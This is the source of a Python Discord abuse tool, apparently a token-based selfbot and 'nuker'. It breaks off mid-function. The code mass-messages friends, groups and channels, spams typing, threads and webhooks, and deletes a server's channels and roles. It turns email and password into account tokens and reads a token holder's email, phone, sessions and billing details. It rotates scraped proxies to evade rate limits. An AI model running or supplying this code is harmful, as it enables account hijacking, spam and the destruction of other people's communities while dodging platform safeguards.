import base64
import os
import platform
import time
from itertools import cycle

import aiohttp
from discord_webhook import DiscordWebhook
import requests
from colorama import Fore, init
from lxml.html import fromstring
from datetime import datetime
import discord
from discord.ext import commands

init()

current_directory = os.getcwd()
folder_name = os.path.basename(current_directory)
username = os.getenv("USERNAME")
# Base URL for Discord API
BASE_URL = 'https://discord.com/api/v10'

if not os.path.exists('config.txt'):
    with open('config.txt', 'w') as f:
        f.write('kali')

def menu():
    print(f"""
{Fore.CYAN} ___    ____ _____   __   ___   ____   ___        _____  __ __  ____  
{Fore.CYAN} |   \  |    / ___/  /  ] /   \ |    \ |   \      |     ||  |  ||    \ 
{Fore.CYAN} |    \  |  (   \_  /  / |     ||  D  )|    \     |   __||  |  ||  _  |
{Fore.CYAN} |  D  | |  |\__  |/  /  |  O  ||    / |  D  |    |  |_  |  |  ||  |  |
{Fore.CYAN} |     | |  |/  \ /   \_ |     ||    \ |     | __ |   _] |  :  ||  |  |
{Fore.CYAN} |     | |  |\    \     ||     ||  .  \|     ||  ||  |   |     ||  |  |
{Fore.CYAN} |_____||____|\___|\____| \___/ |__|\_||_____||__||__|    \__,_||__|__|
{Fore.RESET}
                {Fore.LIGHTWHITE_EX}1 - Get a list of friends from the token
                {Fore.LIGHTWHITE_EX}2 - Get token from email and password
                {Fore.LIGHTWHITE_EX}3 - Send a message to friends
                {Fore.LIGHTWHITE_EX}4 - Send a message to friend id or ids
                {Fore.LIGHTWHITE_EX}5 - Change bio by token
                {Fore.LIGHTWHITE_EX}6 - Change display name by token
                {Fore.LIGHTWHITE_EX}7 - Change username by password and token
                {Fore.LIGHTWHITE_EX}8 - Change pronouns by token
                {Fore.LIGHTWHITE_EX}9 - Go to Page 2
                {Fore.LIGHTWHITE_EX}0 - Exit
                {Fore.RESET}
    """)

def menu_page_2():
    print(f"""
{Fore.CYAN} ___    ____ _____   __   ___   ____   ___        _____  __ __  ____  
{Fore.CYAN} |   \  |    / ___/  /  ] /   \ |    \ |   \      |     ||  |  ||    \ 
{Fore.CYAN} |    \  |  (   \_  /  / |     ||  D  )|    \     |   __||  |  ||  _  |
{Fore.CYAN} |  D  | |  |\__  |/  /  |  O  ||    / |  D  |    |  |_  |  |  ||  |  |
{Fore.CYAN} |     | |  |/  \ /   \_ |     ||    \ |     | __ |   _] |  :  ||  |  |
{Fore.CYAN} |     | |  |\    \     ||     ||  .  \|     ||  ||  |   |     ||  |  |
{Fore.CYAN} |_____||____|\___|\____| \___/ |__|\_||_____||__||__|    \__,_||__|__|
{Fore.RESET}
                {Fore.LIGHTWHITE_EX}1 - Change custom status by token
                {Fore.LIGHTWHITE_EX}2 - Boost server by token (I dont know if it works or not)
                {Fore.LIGHTWHITE_EX}3 - Join server by token
                {Fore.LIGHTWHITE_EX}4 - Leave server by token
                {Fore.LIGHTWHITE_EX}5 - Get guilds list
                {Fore.LIGHTWHITE_EX}6 - Get channels in guild
                {Fore.LIGHTWHITE_EX}7 - Send Message to all channels in guild
                {Fore.LIGHTWHITE_EX}8 - Send Message to channel or channels in guild
                {Fore.LIGHTWHITE_EX}9 - Go to page 3
                {Fore.LIGHTWHITE_EX}0 - Back to page 1
                {Fore.RESET}
    """)

def menu_page_3():
    print(f"""
{Fore.CYAN} ___    ____ _____   __   ___   ____   ___        _____  __ __  ____  
{Fore.CYAN} |   \  |    / ___/  /  ] /   \ |    \ |   \      |     ||  |  ||    \ 
{Fore.CYAN} |    \  |  (   \_  /  / |     ||  D  )|    \     |   __||  |  ||  _  |
{Fore.CYAN} |  D  | |  |\__  |/  /  |  O  ||    / |  D  |    |  |_  |  |  ||  |  |
{Fore.CYAN} |     | |  |/  \ /   \_ |     ||    \ |     | __ |   _] |  :  ||  |  |
{Fore.CYAN} |     | |  |\    \     ||     ||  .  \|     ||  ||  |   |     ||  |  |
{Fore.CYAN} |_____||____|\___|\____| \___/ |__|\_||_____||__||__|    \__,_||__|__|
{Fore.RESET}
                {Fore.LIGHTWHITE_EX}1 - Discord group nuker
                {Fore.LIGHTWHITE_EX}2 - thread spammer
                {Fore.LIGHTWHITE_EX}3 - typing spammer
                {Fore.LIGHTWHITE_EX}4 - Get discord groups id
                {Fore.LIGHTWHITE_EX}5 - Send message to all groups
                {Fore.LIGHTWHITE_EX}6 - Send message to group id or ids
                {Fore.LIGHTWHITE_EX}7 - Discord Webhook Spammer
                {Fore.LIGHTWHITE_EX}8 - Send message to webhook
                {Fore.LIGHTWHITE_EX}9 - Go to page 4
                {Fore.LIGHTWHITE_EX}0 - Back to page 2
                {Fore.RESET}
    """)

def menu_page_4():
    print(f"""
{Fore.CYAN} ___    ____ _____   __   ___   ____   ___        _____  __ __  ____  
{Fore.CYAN} |   \  |    / ___/  /  ] /   \ |    \ |   \      |     ||  |  ||    \ 
{Fore.CYAN} |    \  |  (   \_  /  / |     ||  D  )|    \     |   __||  |  ||  _  |
{Fore.CYAN} |  D  | |  |\__  |/  /  |  O  ||    / |  D  |    |  |_  |  |  ||  |  |
{Fore.CYAN} |     | |  |/  \ /   \_ |     ||    \ |     | __ |   _] |  :  ||  |  |
{Fore.CYAN} |     | |  |\    \     ||     ||  .  \|     ||  ||  |   |     ||  |  |
{Fore.CYAN} |_____||____|\___|\____| \___/ |__|\_||_____||__||__|    \__,_||__|__|
{Fore.RESET}
                {Fore.LIGHTWHITE_EX}1 - Get Discord Nitro expiration by token
                {Fore.LIGHTWHITE_EX}2 - Get Country Code by token
                {Fore.LIGHTWHITE_EX}3 - Get sessions by token
                {Fore.LIGHTWHITE_EX}4 - Spammer
                {Fore.LIGHTWHITE_EX}5 - Hypesquad changer
                {Fore.LIGHTWHITE_EX}6 - Create Webhook by token
                {Fore.LIGHTWHITE_EX}7 - Discord server nuker by token
                {Fore.LIGHTWHITE_EX}8 - Get basic user info by token
                {Fore.LIGHTWHITE_EX}0 - Back to page 3
                {Fore.RESET}
    """)

def get_proxies():
    url = 'https://sslproxies.org/'
    response = requests.get(url)

    if response.status_code != 200:
        raise Exception(f"Failed to retrieve proxies: {response.status_code}")

    parser = fromstring(response.text)
    proxies = set()

    rows = parser.xpath('//tbody/tr')
    for i in rows[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            try:
                ip = i.xpath('.//td[1]/text()')[0]
                port = i.xpath('.//td[2]/text()')[0]
                proxy = f"{ip}:{port}"
                proxies.add(proxy)
            except IndexError:
                continue

    return proxies


try:
    proxies = get_proxies()
    if len(proxies) >= 2:
        proxy = proxies.pop()
    else:
        print("Not enough proxies found.")
except Exception as e:
    print(f"Error: {str(e)}")

def typer(channelid, token):
    request = f'https://discord.com/api/v9/channels/{channelid}/typing'

    headers = {
        "Content-Type": 'text/html; charset=utf-8',
        "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    proxy = next(proxy_pool)
    response = requests.post(url=request, headers=headers, proxies={"http": proxy})
    if response.status_code == 204:
        print("Successfully send request to type")
    elif response.status_code == 429:
        retry_after = response.json().get('retry_after', 1)
        print(f'Rate limit, retry after {retry_after} seconds.')
        time.sleep(retry_after)
        proxy = next(proxy_pool)
        typer(channelid, token)
    else:
        print("Error: Unknown, no content")
def get_friends_list(token):
    url = "https://discord.com/api/v9/users/@me/relationships"
    headers = {
        "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.get(url, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        friends = response.json()
        friend_ids = [friend["id"] for friend in friends]
        return friend_ids
    else:
        print(f"Failed to retrieve friends list: {response.status_code}")
        return []

def get_friends_list_user(token):
    url = "https://discord.com/api/v9/users/@me/relationships"
    headers = {
        "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.get(url, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        friends = response.json()
        return '\n'.join([f"{friend['id']} - {friend['name']}" for friend in friends])
    else:
        print(f"Failed to retrieve friends list: {response.status_code}")
        return []

def get_discord_guilds(token):
    url = "https://discord.com/api/v10/users/@me/guilds"
    headers = {
        "Authorization": f"{token}"
    }

    response = requests.get(url, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        guilds = response.json()
        return [(guild['id'], guild['name']) for guild in guilds]
    else:
        print(f"Failed to fetch guilds: {response.status_code}")
        return []

def get_discord_guilds_user(token):
    url = "https://discord.com/api/v10/users/@me/guilds"
    headers = {
        "Authorization": f"{token}",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.get(url, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        guilds = response.json()
        return '\n'.join([f"{guild['id']} - {guild['name']}" for guild in guilds])
    else:
        print(f"Failed to fetch guilds: {response.status_code}")
        return []

def send_message_group(channel_id, message_content, discord_token):
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    headers = {
        'Authorization': f'{discord_token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    payload = {
        'content': message_content
    }
    proxy = next(proxy_pool)
    response = requests.post(url, headers=headers, json=payload, proxies={"http": proxy})

    if response.status_code == 200:
        print(f'Send message successfully to ID {channel_id}')
    elif response.status_code == 429:
        retry_after = response.json().get('retry_after', 1)
        print(f'Rate limit. Retry after {retry_after} seconds.')
        time.sleep(retry_after)
        proxy = next(proxy_pool)
        send_message_group(channel_id, message_content, discord_token)
    else:
        print(f'Error to ID {channel_id}: {response.status_code}')
        print(f"Response: {response.json()}")

def change_name_group(channel_id, message_content, discord_token):
    url = f'https://discord.com/api/v9/channels/{channel_id}'
    headers = {
        'Authorization': f'{discord_token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    payload = {
        'name': message_content
    }
    proxy = next(proxy_pool)
    response = requests.patch(url, headers=headers, json=payload, proxies={"http": proxy})

    if response.status_code == 200:
        print(f'Change group name request successfully send to ID {channel_id}')
    elif response.status_code == 429:
        retry_after = response.json().get('retry_after', 1)
        print(f'Rate limit. Retry after {retry_after} seconds.')
        time.sleep(retry_after)
        proxy = next(proxy_pool)
        change_name_group(channel_id, message_content, discord_token)
    else:
        print(f'Error to id {channel_id}: {response.status_code}')
        print(f"Response: {response.json()}")

def change_bio(token, bio):
    request_url = "https://discord.com/api/v9/users/@me/profile"
    payload = {
        "bio": bio,
    }
    headers = {
        "Content-Type": "application/json", "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        print("Successfully changed bio")
    elif response.status_code == 401:
        print("Failed to change bio: Unauthorized. Please check your token.")
    elif response.status_code == 400:
        print("Captcha error")
    else:
        print(f"Failed to change bio: {response.status_code} {response.text}")

def change_display_name(token, display_name):
    request_url = "https://discord.com/api/v9/users/@me"
    payload = {
        'global_name': display_name,
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        print("Successfully changed display name")
    elif response.status_code == 401:
        print("Failed to change display name: Unauthorized. Please check your token.")
    elif response.status_code == 400:
        print("Captcha error")
    else:
        print(f"Failed to change display name: {response.status_code} {response.text}")

def thread_spammer(token, channel_id, message_id, thread_name):
    global thread_data
    request_url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/threads'
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    payload = {
        'name': thread_name
    }
    proxy = next(proxy_pool)
    response = requests.post(request_url, headers=headers, json=payload, proxies={"http": proxy})

    if response.status_code == 201:
        thread_data = response.json()
        print("Successfully created thread")
        print(f"Thread Channel ID: {thread_data['id']}")
    elif response.status_code == 429:
        retry_after = response.json().get('retry_after', 1)
        print(f'Rate limit, retry after {retry_after} seconds.')
        time.sleep(retry_after)
        thread_spammer(token, channel_id, message_id, thread_name)
    else:
        print("Error: " + response.json())
    request_url = f'https://discord.com/api/v9/channels/{thread_data["id"]}'
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    response = requests.delete(request_url, headers=headers)
    if response.status_code == 200:
        print("Successfully delete the thread")
    elif response.status_code == 429:
        retry_after = response.json().get('retry_after', 1)
        print(f'Rate limit, retry after {retry_after} seconds.')
        time.sleep(retry_after)
        proxyg = next(proxy_pool)
        thread_spammer(token, channel_id, message_id, thread_name)
    else:
        print("Error: " + response.json())

def get_info_user(token):
    request_url = "https://discord.com/api/v9/users/@me"
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    try:
        response = requests.get(request_url, headers=headers)
        response.raise_for_status()  # Raise an HTTPError for bad responses
        user_info = response.json()
        print("Getting information successfully")
        print("Display Name:", user_info.get("global_name", "N/A"))
        print("User Name:", user_info.get("username", "N/A"))
        print("Bio:", user_info.get("bio", "N/A"))
        print("Id:", user_info.get("id", "N/A"))
        print("MFA Enabled:", user_info.get("mfa_enabled", "N/A"))
        print("Email:", user_info.get("email", "N/A"))
        print("Phone:", user_info.get("phone", "N/A"))
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def change_pronouns(token, pronouns):
    request_url = "https://discord.com/api/v9/users/@me/profile"
    payload = {
        'pronouns': pronouns,
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        print("Successfully changed pronouns")
    elif response.status_code == 401:
        print("Failed to change pronouns: Unauthorized. Please check your token.")
    elif response.status_code == 400:
        print("Captcha error")
    else:
        print(f"Failed to change pronouns: {response.status_code} {response.text}")

def change_username(username, password, token):
    request_url = "https://discord.com/api/v9/users/@me"
    payload = {
        'password': password,
        'username': username
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        print("Successfully changed pronouns")
    elif response.status_code == 401:
        print("Failed to change pronouns: Unauthorized. Please check your token.")
    elif response.status_code == 400:
        print("Captcha error")
    else:
        print(f"Failed to change pronouns: {response.status_code} {response.text}")


def get_token(email, password):
    request_url = "https://discord.com/api/v9/auth/login"
    payload = {
        "login": email,
        "password": password,
        "undelete": False,
        "captcha_key": None,
        "login_source": None,
        "gift_code_sku_id": None,
    }
    headers = {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.post(request_url, json=payload, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        token_data = response.json()
        access_token = token_data.get('token')
        if access_token:
            print(f"Access token: {access_token}")
        else:
            print("Access token not found in response.")
    elif response.status_code == 400:
        print("Captcha error")
    else:
        print(f"Failed to retrieve access token: {response.status_code} {response.text}")


def change_custom_status(encoded_str, replacements, token):
    decoded_bytes = base64.b64decode(encoded_str)
    decoded_str = decoded_bytes.decode('utf-8', errors='ignore')

    for old_word, new_word in replacements.items():
        decoded_str = decoded_str.replace(old_word, new_word)

    modified_bytes = decoded_str.encode('utf-8')
    modified_encoded_str = base64.b64encode(modified_bytes).decode('utf-8')

    request_url = 'https://discord.com/api/v9/users/@me/settings-proto/1'
    payload = {
        "settings": modified_encoded_str
    }
    headers = {
        "Content-Type": "application/json",
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.patch(request_url, json=payload, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        print("Changed custom status successfully")
    elif response.status_code == 400:
        print("Captcha error")
    else:
        print(f"Failed to retrieve access token: {response.status_code} {response.text}")

def get_channels_id(guild_id, token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        channels = response.json()
        return '\n'.join([f"{channel['id']} - {channel['name']}" for channel in channels])
    else:
        print(f'Failed to fetch channels: {response.status_code} - {response.text}')


def get_channels_id_sys(guild_id, token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        channels = response.json()
        channels_id = [channel["id"] for channel in channels]
        return channels_id
    else:
        print(f'Failed to fetch channels: {response.status_code} - {response.text}')

def join_server(invite_link, TOKEN):
    HEADERS = {
        'Authorization': TOKEN,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    invite_code = invite_link.split('/')[-1]
    url = f'https://discord.com/api/v9/invites/{invite_code}'
    response = requests.post(url, headers=HEADERS, proxies={"http": proxy})
    if response.status_code == 200:
        print(f'Successfully joined server with invite code {invite_code}')
    elif response.status_code == 400:
        print("Captcha Error")
    else:
        print(f'Failed to join server: {response.status_code} - {response.text}')
def send_message_to_friend(token, message_content, id):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    for friend_id in id:
        proxies = get_proxies()
        proxy_pool = cycle(proxies)
        url = f'https://discord.com/api/v10/users/@me/channels'
        try:
            proxy = next(proxy_pool)
            response = requests.post(url, headers=headers, json={'recipient_id': friend_id}, proxies={"http": proxy})
            if response.status_code == 200:
                channel_id = response.json()['id']
                url_message = f'https://discord.com/api/v9/channels/{channel_id}/messages'
                response_message = requests.post(url_message, headers=headers, json={'content': message_content}, proxies={"http": proxy})

                if response_message.status_code == 200:
                    print(f'Message sent successfully to friend with ID {friend_id}')
                else:
                    print(f'Error sending message to friend with ID {friend_id}: {response_message.status_code}')
            else:
                print(f'Error creating channel for friend with ID {friend_id}: {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Error sending message to friend with ID {friend_id}: {e}')


def send_message_to_channel(token, message_content, channel_ids):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    proxies = get_proxies()
    proxy_pool = cycle(proxies)
    for channel_id in channel_ids:
        proxy = next(proxy_pool)
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
        try:

            response = requests.post(url, headers=headers, json={'content': message_content}, proxies={"http": proxy})

            if response.status_code == 200:
                print(f'Message sent successfully to channel with ID {channel_id}')
            else:
                print(f'Error sending message to channel with ID {channel_id}: {response.status_code}')

        except requests.exceptions.RequestException as e:
            print(f'Error sending message to channel with ID {channel_id}: {e}')


def get_discord_group_dms(token):
    url = 'https://discord.com/api/v10/users/@me/channels'
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.get(url, headers=headers, proxies={"http": proxy})

    if response.status_code == 200:
        channels = response.json()
        group_dms = [channel for channel in channels if channel['type'] == 3]
        return group_dms
    else:
        response.raise_for_status()

def hypesquad(token, house_id):
    url = 'https://discord.com/api/v9/hypesquad/online'
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    payload = {
        'house_id': house_id
    }

    proxies = get_proxies().pop()  # Adjust if needed
    try:
        response = requests.post(url, headers=headers, json=payload, proxies={"http": proxies})
        response.raise_for_status()  # Raise an exception for HTTP errors

        if response.status_code == 204:
            print("Successfully changed the HypeSquad badge")
        else:
            print(f"Error {response.status_code}: {response.text}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")



def print_group_dms(group_dms):
    for dm in group_dms:
        print(f'Group DM ID: {dm["id"]}')
        print(f'Name: {dm["name"]}')
        print(f'Owner ID: {dm["owner_id"]}')
        print('Recipients:')
        for recipient in dm['recipients']:
            print(f'  - Username: {recipient["username"]}, Global Name: {recipient.get("global_name")}, ID: {recipient["id"]}')
        print('-' * 40)


def send_message_to_group(token, message, channel_id):
    url = f'https://discord.com/api/v10/channels/{channel_id}/messages'
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    payload = {
        'content': message
    }

    response = requests.post(url, headers=headers, json=payload)

    if response.status_code == 200 or response.status_code == 201:
        print(f"Message sent to channel ID {channel_id}")
    else:
        print(f"Failed to send message to channel ID {channel_id}: {response.status_code} {response.text}")

def convert_iso_to_readable(iso_timestamp):
    dt = datetime.fromisoformat(iso_timestamp.replace("Z", "+00:00"))
    return dt.strftime("%d %B %Y, %H:%M:%S (UTC)")

def discord_nitro_expire(token):
    url = 'https://discord.com/api/v9/users/@me/billing/subscriptions'
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.get(url, headers=headers, proxies={"http": get_proxies().pop()})

    if response.status_code == 200:
        subscriptions = response.json()
        if subscriptions:
            for subscription in subscriptions:
                current_period_start = convert_iso_to_readable(subscription['current_period_start'])
                current_period_end = convert_iso_to_readable(subscription['current_period_end'])
                print(f"Current Period Start: {current_period_start}")
                print(f"Current Period End: {current_period_end}")
        else:
            print("No active subscriptions found.")
    else:
        print(f"Error {response.status_code}: {response.text}")

def get_sessions(token):
    url = 'https://discord.com/api/v9/auth/sessions'
    headers = {
        'Authorization': f'{token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    proxies = get_proxies()  # Adjust if needed
    try:
        response = requests.get(url, headers=headers, proxies={"http": proxies.pop()})
        response.raise_for_status()  # Raise an exception for HTTP errors

        if response.status_code == 200:
            sessions = response.json()
            if sessions:
                for session in sessions.get('user_sessions', []):
                    client_info = session.get('client_info', {})
                    os = client_info.get('os', 'N/A')
                    platform = client_info.get('platform', 'N/A')
                    location = client_info.get('location', 'N/A')
                    print(f"\nOS: {os}")
                    print(f"PLATFORM: {platform}")
                    print(f"LOCATION: {location}")
            else:
                print("No sessions found.")
        else:
            print(f"Error {response.status_code}: {response.text}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")


def country_code_by(token):
    url = 'https://discord.com/api/v9/users/@me/billing/country-code'
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    try:
        response = requests.get(url, headers=headers, proxies={"http": get_proxies().pop()})
        response.raise_for_status()  # Will raise an HTTPError for bad responses

        if response.status_code == 200:
            data = response.json()
            if 'country_code' in data:
                country_code = data['country_code']
                print(f"Country code: {country_code}")
            else:
                print("Country code not found in response.")
        else:
            print(f"Error {response.status_code}: {response.text}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")


def leaver(token, guild_id):
    url = f'https://discord.com/api/v9/users/@me/guilds/{guild_id}'

    headers = {
        'Authorization': f'{token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    response = requests.delete(url, headers=headers, proxies={"http": proxy})

    if response.status_code == 204:
        print('Successfully left the server.')
    else:
        print(f'Failed to leave the server. Status code: {response.status_code}, Response: {response.text}')

def create_webhook(token, channel_id, webhook_name):
    url = f"https://discord.com/api/v10/channels/{channel_id}/webhooks"

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }

    json_data = {
        "name": webhook_name
    }
    proxy = get_proxies().pop()
    response = requests.post(url, headers=headers, json=json_data, proxies={"http": proxy})

    if response.status_code == 200:
        webhook_info = response.json()
        print(f"Webhook created: {webhook_info['url']}")
    else:
        print(f"Error: {response.status_code}")
        print(response.json())

def delete_channels(guild_id, token):
    # Headers for authorization
    HEADERS = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    # Get all channels
    proxy = get_proxies().pop()
    response = requests.get(f'{BASE_URL}/guilds/{guild_id}/channels', headers=HEADERS, proxies={"http": proxy})
    if response.status_code == 200:
        channels = response.json()
        for channel in channels:
            try:
                channel_id = channel['id']
                # Delete channel
                proxy = get_proxies().pop()
                requests.delete(f'{BASE_URL}/channels/{channel_id}', headers=HEADERS, proxies={"http": proxy})
                print(f'Channel {channel["name"]} deleted.')
            except Exception as e:
                print(f'Failed to delete channel {channel["name"]}: {e}')
    else:
        print('Failed to retrieve channels:', response.json())

def delete_roles(guild_id, token):
    # Headers for authorization
    HEADERS = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
    }
    # Get all roles
    proxy = get_proxies().pop()
    response = requests.get(f'{BASE_URL}/guilds/{guild_id}/roles', headers=HEADERS, proxies={"http": proxy})
    if response.status_code == 200:
        roles = response.json()
        for role in roles:
            if role['name'] != "@everyone":  # Do not delete @everyone role
                try:
                    role_id = role['id']
                    # Delete role
                    requests.delete(f'{BASE_URL}/guilds/{guild_id}/roles/{role_id}', headers=HEADERS, proxies={"http": proxy})
